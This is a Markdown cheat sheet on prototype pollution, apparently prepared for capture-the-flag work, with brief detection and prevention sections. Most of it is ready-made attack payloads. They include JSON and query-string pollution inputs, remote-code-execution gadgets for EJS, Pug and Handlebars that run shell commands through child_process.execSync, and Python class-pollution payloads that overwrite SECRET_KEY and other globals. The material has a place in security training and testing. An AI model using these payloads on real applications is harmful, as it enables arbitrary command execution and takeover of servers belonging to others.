# Prototype Pollution

## What Is It
JavaScript prototype pollution allows an attacker to modify `Object.prototype`, affecting all objects in the application.

## Detection
Look for:
- Deep merge / deep copy functions that don't sanitize keys
- `lodash.merge()`, `lodash.set()`, `jQuery.extend(true, ...)`
- Any recursive object merge accepting user input
- JSON body with `__proto__`, `constructor.prototype`, `constructor`

## Basic Payloads

### Via JSON body
```json
{"__proto__": {"admin": true}}
{"constructor": {"prototype": {"admin": true}}}
```

### Via query string
```
?__proto__[admin]=1
?constructor[prototype][admin]=1
?__proto__.admin=1
```

### Via path parameters
```
/api/update
Body: {"__proto__": {"role": "admin"}}
```

## Common Exploitation Targets

### Express/EJS RCE
If the app uses EJS templating with prototype pollution:
```json
{"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('cat /flag');s"}}
```

### Pug/Jade RCE
```json
{"__proto__": {"block": {"type": "Text", "line": "process.mainModule.require('child_process').execSync('cat /flag')"}}}
```

### Handlebars RCE
```json
{"__proto__": {"pendingContent": "x]];process.mainModule.require('child_process').execSync('cat /flag');//"}}
```

## Python Class Pollution (Pydash / merge functions)
Python equivalent using `pydash.set_()` or custom merge:
```json
{"__class__": {"__init__": {"__globals__": {"SECRET_KEY": "hacked"}}}}
```
Or via `__init__.__globals__`:
```python
# If merge function traverses __class__.__init__.__globals__
payload = {
    "__class__": {
        "__init__": {
            "__globals__": {
                "flag": "controlled_value"
            }
        }
    }
}
```

## Prevention
- Freeze prototypes: `Object.freeze(Object.prototype)`
- Use `Map` instead of plain objects
- Sanitize keys: reject `__proto__`, `constructor`, `prototype`
